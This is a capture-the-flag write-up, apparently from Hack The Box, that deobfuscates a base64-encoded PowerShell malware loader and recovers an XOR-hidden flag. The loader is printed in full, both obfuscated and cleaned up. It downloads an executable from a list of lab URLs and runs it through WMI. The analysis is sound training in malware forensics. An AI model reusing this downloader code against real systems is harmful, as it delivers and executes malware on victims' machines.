AEgAYQBSAF0AOQAyACkAKQA7ACQARgBOADUAZwBnAG0AcwBIACAAPQAgACgAMQA4ADIALAAxADgANwAsADIAMgA5ACwAMQA0ADYALAAyADMAMQAsADEANwA3ACwAMQA1ADEALAAxADQAOQAsADEANgA2ACkAOwAkAFAAeQBvAHoAZwBlAG8APQAoACgAJwBKADUAZgAnACsAJwB5ADEAJwApACsAJwBjACcAKwAnAGMAJwApADsAIAAoACAAIAB2AGEAUgBpAEEAQgBMAEUAIABUAHgAWQBTAEUAbwAgACAAKQAuAFYAYQBsAHUARQA6ADoAIgBTAGUAYwBVAHIASQBgAFQAWQBwAGAAUgBgAE8AdABPAGMAYABvAGwAIgAgAD0AIAAoACgAJwBUAGwAJwArACcAcwAxACcAKQArACcAMgAnACkAOwAkAEYATgA1AGcAZwBtAHMASAAgACsAPQAgACgAMQA4ADYALAAxADQAMQAsADIAMgA4ACwAMQA4ADIALAAxADcANwAsADEANwAxACwAMgAyADkALAAyADMANgAsADIAMwA5ACwAMgAzADkALAAyADMAOQAsADIAMgA4ACwAMQA4ADEALAAxADgAMgAsADEANwAxACwAMgAyADkALAAyADMANAAsADIAMwA5ACwAMgAzADkALAAyADIAOAApADsAJABIAHUAYQBqAGcAYgAwAD0AKAAoACcASgBuACcAKwAnAG8AJwApACsAJwA1AGcAJwArACcAYQAxACcAKQA7ACQAQgBiADIAOAB1AG0AbwAgAD0AIAAoACgAJwBBAGwAZQAnACsAJwA3AGcAJwApACsAJwBfADgAJwApADsAJABIAHMAYwBlAF8AagBzAD0AKAAnAEsAdgAnACsAKAAnAG4AYgAnACsAJwBvAHYAXwAnACkAKQA7ACQAUwBwAGsANQAxAHUAZQA9ACgAKAAnAEMAJwArACcANwB4AG8AJwApACsAJwA5AGcAJwArACcAbAAnACkAOwAkAFMAYwB1AHMAYgBrAGoAPQAkAEgATwBNAEUAKwAoACgAJwA1ACcAKwAnAHQAJwArACgAJwBmACcAKwAnAEoAcgBiAGUAdgAnACsAJwBrACcAKQArACgAJwA0ADUAdABmACcAKwAnAEMAYwAnACsAJwB3ACcAKQArACcAcgAnACsAKAAnAF8AMgBoACcAKwAnADUAdABmACcAKQApACAALQByAEUAcABsAEEAQwBFACAAIAAoAFsAQwBoAEEAUgBdADUAMwArAFsAQwBoAEEAUgBdADEAMQA2ACsAWwBDAGgAQQBSAF0AMQAwADIAKQAsAFsAQwBoAEEAUgBdADkAMgApACsAJABCAGIAMgA4AHUAbQBvACsAKAAoACcALgBlACcAKwAnAHgAJwApACsAJwBlACcAKQA7ACQARgBOADUAZwBnAG0AcwBIACAAKwA9ACAAKAAxADgANQAsADEANwA5ACwAMQA5ADAALAAxADgANAAsADIAMgA5ACwAMQA1ADEALAAxADMAOQAsADEANQA3ACwAMQA2ADQALAAyADMANQAsADEANwA3ACwAMgAzADkALAAxADcAMQAsADEAOAAzACwAMgAzADYALAAxADQAMQAsADEAMgA4ACwAMQA4ADcALAAyADMANQAsADEAMwA0ACwAMQAyADgALAAxADUAOAAsADEANwA3ACwAMQA3ADYALAAxADMAOQApADsAJABoAGIAbQBzAGsAVgAyAFQAPQAoACgAJwBDACcAKwAnADcAeABvACcAKQArACcAOQBnACcAKwAnAGwAJwApADsAJABoAGIAbQBzAGsAVgAyAFQAPQAkAEgATwBNAEUAKwAoACgAJwA1ACcAKwAnAHQAJwArACgAJwBmACcAKwAnAEoAcgBiAGUAdgAnACsAJwBrACcAKQArACgAJwA0ADUAdABmACcAKwAnAEMAYwAnACsAJwB3ACcAKQArACcAcgAnACsAKAAnAF8AMgBoACcAKwAnADUAdABmACcAKQApACAALQByAEUAcABsAEEAQwBFACAAIAAoAFsAQwBoAEEAUgBdADUAMwArAFsAQwBoAEEAUgBdADEAMQA2ACsAWwBDAGgAQQBSAF0AMQAwADIAKQAsAFsAQwBoAEEAUgBdADkAMgApACsAJABCAGIAMgA4AHUAbQBvACsAKAAoACcALgBjACcAKwAnAG8AJwApACsAJwBuAGYAJwApADsAJABRADEAXwB5ADAANQBfAD0AKAAnAFcAJwArACgAJwA0ACcAKwAnAHEAdgB5ACcAKQArACcAegA4ACcAKQA7ACQATwBkAGIAMwBoAGYAMwA9ACYAKAAnAG4AJwArACcAZQAnACsAJwB3AC0AbwBiAGoAZQBjAHQAJwApACAATgBlAHQALgBXAEUAQgBjAGwASQBFAE4AdAA7ACQARgBOADUAZwBnAG0AcwBIACAAKwA9ACAAKAAxADgAMwAsADEANQA0ACwAMQA3ADMALAAxADIAOAAsADEANwA1ACwAMQA1ADEALAAyADMAOAAsADEANAAwACwAMQA4ADMALAAxADYAMgAsADIAMgA4ACwAMQA3ADAALAAxADcAMwAsADEANwA5ACwAMgAyADkAKQA7ACQAQQBuAGIAeQB0ADEAeQA9ACgAJwBoACcAKwAoACcAdAB0AHAAOgAnACsAJwBdAFsAJwArACcAKABzACkAXQAnACkAKwAoACgAJwB3AF0AJwArACcAWwAoACcAKQApACsAKAAoACcAcwApACcAKwAnAF0AdwAnACkAKQArACgAJwBkAGEAJwArACcALQAnACkAKwAnAGkAJwArACcAbgAnACsAJwBkAHUAJwArACgAJwBzACcAKwAnAHQAcgBpAGEAbAAuACcAKwAnAGgAJwArACcAdAAnACkAKwAnAGIAXQAnACsAKAAnAFsAKABzACkAXQAnACsAJwB3ACcAKwAnAGoAcwAnACkAKwAoACgAJwBdACcAKwAnAFsAKAAnACkAKQArACgAKAAnAHMAJwArACcAKQBdAHcAOQBJAGQATAAnACsAJwBQAF0AWwAnACsAJwAoAHMAJwArACcAKQBdAHcAJwArACcAQABoACcAKQApACsAKAAnAHQAJwArACcAdABwADoAXQAnACkAKwAoACcAWwAoAHMAJwArACcAKQBdACcAKQArACcAdwAnACsAKAAnAF0AJwArACcAWwAoAHMAKQBdACcAKQArACgAJwB3AGQAYQBwACcAKwAnAHIAbwAnACsAJwBmAGUAcwBpAG8AbgBhACcAKwAnAGwALgBoACcAKQArACcAdABiACcAKwAoACcAXQBbACgAcwAnACsAJwApACcAKwAnAF0AJwApACsAJwB3ACcAKwAoACcAZAAnACsAJwBhAHQAYQAnACkAKwAoACcANABdAFsAKABzACcAKwAnACkAXQB3AGgAJwApACsAKAAnAFcAZwBXACcAKwAnAGoAVAAnACkAKwAoACcAVgBdACcAKwAnAFsAJwApACsAKAAnACgAcwApAF0AdwBAAGgAdAB0AHAAJwArACcAcwA6AF0AWwAoAHMAJwArACcAKQBdACcAKwAnAHcAJwArACcAXQAnACkAKwAnAFsAJwArACgAJwAoAHMAKQAnACsAJwBdAHcAZABhAGcAJwArACcAcgBhACcAKQArACcAbgBpACcAKwAnAHQAJwArACgAJwBlAGcAJwArACcAaQBhACcAKQArACgAJwByAGUALgBoACcAKwAnAHQAJwApACsAJwBiAF0AJwArACgAJwBbACcAKwAnACgAcwApACcAKQArACgAJwBdAHcAdwAnACsAJwBwAC0AYQAnACsAJwBkAG0AJwArACcAaQBuAF0AWwAoAHMAKQAnACsAJwBdAHcAdAAnACkAKwAoACcAVgBdAFsAJwArACcAKABzACcAKwAnACkAJwApACsAKAAnAF0AdwBAACcAKwAnAGgAJwApACsAJwB0AHQAJwArACcAcAAnACsAKAAnADoAJwArACcAXQBbACcAKQArACgAJwAoAHMAKQBdAHcAXQBbACcAKwAnACgAcwAnACsAJwApAF0AdwB3AHcAJwArACcAdwAnACsAJwAuAG8AdQB0ACcAKwAnAHMAJwArACcAcAAnACkAKwAoACcAbwBrACcAKwAnAGUAJwApACsAJwBuAHYAJwArACcAaQAnACsAKAAnAHMAJwArACcAaQBvAG4AcwAuACcAKQArACgAJwBoAHQAYgAnACsAJwBdACcAKQArACcAWwAnACsAKAAnACgAcwApAF0AdwAnACsAJwB3AHAAJwArACcALQBpAG4AJwApACsAKAAnAGMAbAB1ACcAKwAnAGQAJwApACsAKAAnAGUAcwBdAFsAKABzACkAJwArACcAXQB3AGEAVwAnACsAJwBvACcAKwAnAE0AJwApACsAKAAnAF0AJwArACcAWwAoACcAKwAnAHMAKQBdAHcAJwApACsAKAAnAEAAJwArACcAaAB0AHQAcAA6AF0AJwApACsAKAAnAFsAKABzACkAJwArACcAXQB3AF0AWwAoACcAKwAnAHMAKQAnACkAKwAoACcAXQB3AG0AbwAnACsAJwBiAHMAJwApACsAKAAnAG8AJwArACcAdQBrAC4AaAAnACkAKwAoACgAJwB0ACcAKwAnAGIAXQBbACgAJwApACkAKwAoACgAJwBzACkAJwArACcAXQB3AHcAcAAtACcAKQApACsAJwBpAG4AJwArACcAYwAnACsAJwBsACcAKwAoACcAdQBkAGUAJwArACcAcwBdACcAKwAnAFsAJwApACsAKAAnACgAcwApAF0AJwArACcAdwAnACkAKwAoACcAVQBZACcAKwAnADMAMABSAF0AJwApACsAKAAnAFsAKABzACcAKwAnACkAXQB3ACcAKwAnAEAAJwArACcAaAAnACsAJwB0AHQAcAA6AF0AWwAnACkAKwAoACcAKAAnACsAJwBzACkAXQB3ACcAKQArACgAJwBdAFsAJwArACcAKABzACkAJwApACsAKAAnAF0AJwArACcAdwBiACcAKQArACcAaQAnACsAKAAnAGcAJwArACcAbABhAHUAZwBoACcAKwAnAHMAJwApACsAKAAoACcALgBoACcAKwAnAHQAJwArACcAYgBdAFsAKABzACcAKQApACsAKAAoACcAKQBdACcAKQApACsAKAAnAHcAcwAnACsAJwBtAGEAbABsAHAAbwB0ACcAKwAnAGEAdABvACcAKQArACcAZQBzACcAKwAoACgAJwBdACcAKwAnAFsAKABzACcAKQApACsAKAAoACcAKQBdAHcAWQBdACcAKwAnAFsAKABzACcAKwAnACkAXQB3ACcAKwAnAEAAaAAnACsAJwB0AHQAcABzADoAXQBbACgAcwApACcAKQApACsAJwBdAHcAJwArACgAJwBdAFsAKAAnACsAJwBzACkAXQB3AG4AJwArACcAZwAnACkAKwAoACcAbABsACcAKwAnAG8AJwApACsAKAAnAGcAaQBzAHQAJwArACcAaQAnACkAKwAoACcAYwBzAC4AJwArACcAaAAnACkAKwAnAHQAJwArACgAJwBiAF0AJwArACcAWwAnACsAJwAoACcAKwAnAHMAKQBdAHcAJwApACsAJwBhAGQAJwArACgAJwBtAGkAJwArACcAbgAnACkAKwAnAGUAcgAnACsAJwBdACcAKwAoACcAWwAoAHMAJwArACcAKQBdAHcAJwArACcAVwAzAG0AJwApACsAJwBrACcAKwAoACgAJwBCACcAKwAnAF0AWwAoAHMAJwApACkAKwAoACgAJwApACcAKwAnAF0AdwAnACkAKQApAC4AIgByAGUAcABgAEwAQQBjAEUAIgAoACgAJwBdACcAKwAnAFsAJwArACgAJwAoAHMAKQBdACcAKwAnAHcAJwApACkALAAoAFsAYQByAHIAYQB5AF0AKAAnAC8AJwApACwAKAAnAHgAdwAnACsAJwBlACcAKQApAFsAMABdACkALgAiAHMAUABgAGwASQBUACIAKAAkAEkAdgBnADMAegBjAHUAIAArACAAJABWAHgAbgBsAHIAZQAwACAAKwAgACQASgB6AGEAZQB3AGQAeQApADsAJABHAGMAbwB5AHYAbAB2AD0AKAAoACcASwBmACcAKwAnAF8AJwApACsAKAAnADkAJwArACcAZQB0ADEAJwApACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAEEAOABpADMAawBlADEAIABpAG4AIAAkAEEAbgBiAHkAdAAxAHkAKQB7AHQAcgB5AHsAJABPAGQAYgAzAGgAZgAzAC4AIgBkAE8AYABXAG4ATABPAEEAYABkAGYASQBMAGUAIgAoACQAQQA4AGkAMwBrAGUAMQAsACAAJABTAGMAdQBzAGIAawBqACkAOwAkAFoAaABjAG4AYQB1AHgAPQAoACgAJwBFAGsAJwArACcAawAnACkAKwAoACcAagAnACsAJwA0ADcAdAAnACkAKQA7AEkAZgAgACgAKAAmACgAJwBHAGUAdAAtAEkAJwArACcAdABlACcAKwAnAG0AJwApACAAJABTAGMAdQBzAGIAawBqACkALgAiAEwARQBuAGAARwBUAGgAIgAgAC0AZwBlACAANAA1ADEAOQA5ACkAIAB7ACQAewBBADgAYABJAGAAMwBLAEUAMQB9AC4AKAAiAHsAMQB9AHsAMgB9AHsAMAB9ACIAIAAtAGYAJwBhAHkAJwAsACcAVABvAEMAaABhACcALAAnAHIAQQByAHIAJwApAC4ASQBuAHYAbwBrAGUAKAApACAAfAAgAC4AKAAiAHsAMgB9AHsAMQB9AHsAMAB9AHsAMwB9ACIAIAAtAGYAJwAtACcALAAnAGEAYwBoACcALAAnAEYAbwByAEUAJwAsACcATwBiAGoAZQBjAHQAJwApACAALQBwAHIAbwBjAGUAcwBzACAAewAgACQAewBGAE4ANQBgAEcARwBtAGAAUwBoAH0AIAArAD0AIAAoAFsAYgB5AHQAZQBdAFsAYwBoAGEAcgBdACQAewBfAH0AIAAtAGIAeABvAHIAIAAwAHgAZABmACAAKQAgAH0AOwAgACQARgBOADUAZwBnAG0AcwBIACAAKwA9ACAAKAAyADIAOAApADsAIAAkAGIAMABSAGoAZQAgAD0AIAAgAFsAdAB5AHAAZQBdACgAIgB7ADEAfQB7ADAAfQAiACAALQBGACcAVgBlAHIAVAAnACwAJwBDAG8AbgAnACkAOwAgACAAIAAkAEIAMABSAGoARQA6ADoAIgB0AE8AYABCAGEAUwBgAEUANgA0AFMAYABUAFIASQBgAE4AZwAiACgAJAB7AGYAbgA1AGAAZwBnAG0AYABzAGgAfQApACAAfAAgAC4AKAAiAHsAMgB9AHsAMQB9AHsAMAB9ACIAIAAtAGYAIAAnAGkAbABlACcALAAnAHUAdAAtAGYAJwAsACcAbwAnACkAIAAkAHsAaABCAGAAbQBTAEsAYABWADIAVAB9ADsAIAAoAFsAdwBtAGkAYwBsAGEAcwBzAF0AKAAoACcAdwBpACcAKwAnAG4AJwApACsAKAAnADMAMgBfACcAKwAnAFAAcgBvAGMAJwArACcAZQAnACkAKwAnAHMAJwArACcAcwAnACkAKQAuACIAYwBSAGAAZQBhAFQARQAiACgAJABTAGMAdQBzAGIAawBqACkAOwAkAEcAbAB3AGsAaQA2AGEAPQAoACcASQAnACsAJwBtACcAKwAoACcAdABkACcAKwAnAHgAdgA2ACcAKQApADsAYgByAGUAYQBrADsAJABQAGYAcABiAGwAaAAxAD0AKAAnAFYAcwAnACsAKAAnAGwAYQBsACcAKwAnAGMAJwApACsAJwB1ACcAKQB9AH0AYwBhAHQAYwBoAHsAfQB9ACQARgA0ADcAaQBlAGYAMgA9ACgAKAAnAEIAbgAnACsAJwB6AGkAZAAnACkAKwAnAHIAdAAnACkA
```

[CyberChef > Base64 > Decode Text: UTF-16LE](https://gchq.github.io/CyberChef/#recipe=From_Base64%28'A-Za-z0-9%2B/%3D',true,false%29Decode_text%28'UTF-16LE%20%281200%29'%29&oenc=65001)

```powershell
SV  0zX ([TyPe]("{2}{0}{4}{3}{1}"-f 'e','rECtorY','sYst','.IO.dI','M')  ) ;
set  TxySeo  (  [TYpe]("{0}{7}{5}{6}{4}{2}{1}{8}{3}"-F'SYsTE','TM','IN','ER','pO','NeT.se','RVICE','M.','ANaG')) ;
$Nbf5tg3=('B9'+'yp'+('90'+'s'));
$Vxnlre0=$Cludkjx + [char](64) + $R6r1tuy;
$Ky3q0e8=(('Rq'+'dx')+'wo'+'5');
(  Dir  vaRiAble:0Zx).valuE::"CreAT`E`dIREc`T`OrY"($HOME + ((('nDp'+'Jrb')+('e'+'vk4n')+'D'+'p'+('C'+'cwr_2h')+'nD'+'p') -RePlAcE ('n'+'Dp'),[cHaR]92));
$FN5ggmsH = (182,187,229,146,231,177,151,149,166);
$Pyozgeo=(('J5f'+'y1')+'c'+'c');
(  vaRiABLE TxYSEo  ).ValuE::"SecUrI`TYp`R`OtOc`ol" = (('Tl'+'s1')+'2');
$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);
$Huajgb0=(('Jn'+'o')+'5g'+'a1');
$Bb28umo = (('Ale'+'7g')+'_8');
$Hsce_js=('Kv'+('nb'+'ov_'));
$Spk51ue=(('C'+'7xo')+'9g'+'l');
$Scusbkj=$HOME+(('5'+'t'+('f'+'Jrbev'+'k')+('45tf'+'Cc'+'w')+'r'+('_2h'+'5tf')) -rEplACE  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.e'+'x')+'e');
$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);
$hbmskV2T=(('C'+'7xo')+'9g'+'l');
$hbmskV2T=$HOME+(('5'+'t'+('f'+'Jrbev'+'k')+('45tf'+'Cc'+'w')+'r'+('_2h'+'5tf')) -rEplACE  ([ChAR]53+[ChAR]116+[ChAR]102),[ChAR]92)+$Bb28umo+(('.c'+'o')+'nf');
$Q1_y05_=('W'+('4'+'qvy')+'z8');
$Odb3hf3=&('n'+'e'+'w-object') Net.WEBclIENt;
$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);
$Anbyt1y=('h'+('ttp:'+']['+'(s)]')+(('w]'+'[('))+(('s)'+']w'))+('da'+'-')+'i'+'n'+'du'+('s'+'trial.'+'h'+'t')+'b]'+('[(s)]'+'w'+'js')+((']'+'[('))+(('s'+')]w9IdL'+'P]['+'(s'+')]w'+'@h'))+('t'+'tp:]')+('[(s'+')]')+'w'+(']'+'[(s)]')+('wdap'+'ro'+'fesiona'+'l.h')+'tb'+('][(s'+')'+']')+'w'+('d'+'ata')+('4][(s'+')]wh')+('WgW'+'jT')+('V]'+'[')+('(s)]w@http'+'s:][(s'+')]'+'w'+']')+'['+('(s)'+']wdag'+'ra')+'ni'+'t'+('eg'+'ia')+('re.h'+'t')+'b]'+('['+'(s)')+(']ww'+'p-a'+'dm'+'in][(s)'+']wt')+('V]['+'(s'+')')+(']w@'+'h')+'tt'+'p'+(':'+'][')+('(s)]w]['+'(s'+')]www'+'w'+'.out'+'s'+'p')+('ok'+'e')+'nv'+'i'+('s'+'ions.')+('htb'+']')+'['+('(s)]w'+'wp'+'-in')+('clu'+'d')+('es][(s)'+']waW'+'o'+'M')+(']'+'[('+'s)]w')+('@'+'http:]')+('[(s)'+']w][('+'s)')+(']wmo'+'bs')+('o'+'uk.h')+(('t'+'b][('))+(('s)'+']wwp-'))+'in'+'c'+'l'+('ude'+'s]'+'[')+('(s)]'+'w')+('UY'+'30R]')+('[(s'+')]w'+'@'+'h'+'ttp:][')+('('+'s)]w')+(']['+'(s)')+(']'+'wb')+'i'+('g'+'laugh'+'s')+(('.h'+'t'+'b][(s'))+((')]'))+('ws'+'mallpot'+'ato')+'es'+((']'+'[(s'))+((')]wY]'+'[(s'+')]w'+'@h'+'ttps:][(s)'))+']w'+('][('+'s)]wn'+'g')+('ll'+'o')+('gist'+'i')+('cs.'+'h')+'t'+('b]'+'['+'('+'s)]w')+'ad'+('mi'+'n')+'er'+']'+('[(s'+')]w'+'W3m')+'k'+(('B'+'][(s'))+((')'+']w')))."rep`LAcE"((']'+'['+('(s)]'+'w')),([array]('/'),('xw'+'e'))[0])."sP`lIT"($Ivg3zcu + $Vxnlre0 + $Jzaewdy);
$Gcoyvlv=(('Kf'+'_')+('9'+'et1'));
foreach ($A8i3ke1 in $Anbyt1y){try{$Odb3hf3."dO`WnLOA`dfILe"($A8i3ke1, $Scusbkj);
$Zhcnaux=(('Ek'+'k')+('j'+'47t'));
If ((&('Get-I'+'te'+'m') $Scusbkj)."LEn`GTh" -ge 45199) {${A8`I`3KE1}.("{1}{2}{0}" -f'ay','ToCha','rArr').Invoke() | .("{2}{1}{0}{3}" -f'-','ach','ForE','Object') -process { ${FN5`GGm`Sh} += ([byte][char]${_} -bxor 0xdf ) };
$FN5ggmsH += (228);
$b0Rje =  [type]("{1}{0}" -F'VerT','Con');
$B0RjE::"tO`BaS`E64S`TRI`Ng"(${fn5`ggm`sh}) | .("{2}{1}{0}" -f 'ile','ut-f','o') ${hB`mSK`V2T};
([wmiclass](('wi'+'n')+('32_'+'Proc'+'e')+'s'+'s'))."cR`eaTE"($Scusbkj);
$Glwki6a=('I'+'m'+('td'+'xv6'));
break;
$Pfpblh1=('Vs'+('lal'+'c')+'u')}}catch{}}$F47ief2=(('Bn'+'zid')+'rt')
```

```bash
# SV  0zX ([TyPe]("{2}{0}{4}{3}{1}"-f 'e','rECtorY','sYst','.IO.dI','M')  ) ;
➜ gal sv
CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           sv -> Set-Variable
➜ "{2}{0}{4}{3}{1}"-f 'e','rECtorY','sYst','.IO.dI','M'
sYsteM.IO.dIrECtorY
➜ "{0}{7}{5}{6}{4}{2}{1}{8}{3}"-F'SYsTE','TM','IN','ER','pO','NeT.se','RVICE','M.','ANaG'
SYsTEM.NeT.seRVICEpOINTMANaGER
➜ ('B9'+'yp'+('90'+'s'))
B9yp90s
...
```

```powershell

Set-Value 0zX ([Type]('System.IO.Directory'))
Set-Value TxySeo ([Type]('System.Net.ServicePointManager'))
$Nbf5tg3='B9yp90s'
$Vxnlre0='@';
$Ky3q0e8='Rqdxwo5'
(Get-ChildItem Variable:0zX).Value::"CreateDirectory"($HOME + 'nDp'+'Jrbevk4nDpCcwr_2h'+'nDp' -Replace ('nDp'),'\'))
$FN5ggmsH = (182,187,229,146,231,177,151,149,166)
$Pyozgeo='J5fy1cc'
(Variable TxySeo).Value::"SecurityProtocol" = 'Tls12';
$FN5ggmsH += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);
$Huajgb0='Jno5ga1';
$Bb28umo='Ale7g_8';
$Hsce_js='Kvnbov_';
$Spk51ue='C7xo9gl';
$Scusbkj=$HOME+('5tf'+'Jrbevk45tfCcwr_2h'+'5tf' -Replace '5tf','\') + $Bb28umo +'.exe';
$FN5ggmsH += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);
$hbmskV2T='C7xo9gl'
$hbmskV2T=$HOME+('5tf'+'Jrbevk45tfCcwr_2h'+'5tf' -Replace '5tf','\') + $Bb28umo + '.conf';
$Q1_y05_='W4qvyz8';
$Odb3hf3=&('New-Object') Net.WebClient;
$FN5ggmsH += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);
$Anbyt1y='http:][(s)]w][(s)]wda-industrial.htb][(s)]wjs][(s)]w9IdLP][(s)]w@http:][(s)]w][(s)]wdaprofesional.htb][(s)]wdata4][(s)]whWgWjTV][(s)]w@https:][(s)]w][(s)]wdagranitegiare.htb][(s)]wwp-admin][(s)]wtV][(s)]w@http:][(s)]w][(s)]wwww.outspokenvisions.htb][(s)]wwp-includes][(s)]waWoM][(s)]w@http:][(s)]w][(s)]wmobsouk.htb][(s)]wwp-includes][(s)]wUY30R][(s)]w@http:][(s)]w][(s)]wbiglaughs.htb][(s)]wsmallpotatoes][(s)]wY][(s)]w@https:][(s)]w][(s)]wngllogistics.htb][(s)]wadminer][(s)]wW3mkB][(s)]w'.Replace('][(s)]w',([array]('/'),('xwe'))[0]).Split($Ivg3zcu + $Vxnlre0 + $Jzaewdy);
## http://da-industrial.htb/js/9IdLP/@http://daprofesional.htb/data4/hWgWjTV/@https://dagranitegiare.htb/wp-admin/tV/@http://www.outspokenvisions.htb/wp-includes/aWoM/@http://mobsouk.htb/wp-includes/UY30R/@http://biglaughs.htb/smallpotatoes/Y/@https://ngllogistics.htb/adminer/W3mkB/
# http://da-industrial.htb/js/9IdLP/
# http://daprofesional.htb/data4/hWgWjTV/
# https://dagranitegiare.htb/wp-admin/tV/
# http://www.outspokenvisions.htb/wp-includes/aWoM/
# http://mobsouk.htb/wp-includes/UY30R/
# http://biglaughs.htb/smallpotatoes/Y/
# https://ngllogistics.htb/adminer/W3mkB/
$Gcoyvlv='Kf_9et1';
foreach ($A8i3ke1 in $Anbyt1y) {
    try {
        $Odb3hf3.DownloadFile($A8i3ke1, $Scusbkj); # Tries to download exe
        $Zhcnaux='Ekkj47t';
        if ((&('Get-Item') $Scusbkj).Length -ge 45199) {
            ${A8I3KE1}.ToCharArray.Invoke() | ForEach-Object -process { 
                ${FN5GGmSh} += ([byte][char]${_} -bxor 0xdf ) 
            };
            $FN5ggmsH += (228);
            $b0Rje =  [type]('Convert');
            $B0RjE::"ToBase64String"(${fn5ggmsh}) | .('Out-File') ${hBmSKV2T};
            ([wmiclass]('win32_Process').Create($Scusbkj);
            $Glwki6a='Imtdxv6'
            break;
            $Pfpblh1='Vslalcu'
        }
    } catch { }
}
$F47ief2='Bnzidrt'
```

The XOR seems to depend on URL, but using them yielded no readable text. What if the bytes themselves are encoded with XOR?
```powershell
$enc_data = (182,187,229,146,231,177,151,149,166)
$enc_data += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228);
$enc_data += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139);
$enc_data += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229);

foreach ($enc_byte in $enc_data) {
    ${enc_data} += ([byte][char]${enc_byte} -bxor 0xdf ) 
}
$enc_data += (228);
# echo ([System.Convert]::ToBase64String($enc_data))
echo (-join ($enc_data | % { [char]$_} ))
```

```powershell
└─PS> echo (-join ($enc_data | % { [char]$_} )) | strings
id:M8nHJyeR;int:3000;jit:500;flag:HTB{4n0th3R_d4Y_AnoThEr_pH1Sh};url:
```

> Flag: `HTB{4n0th3R_d4Y_AnoThEr_pH1Sh}`

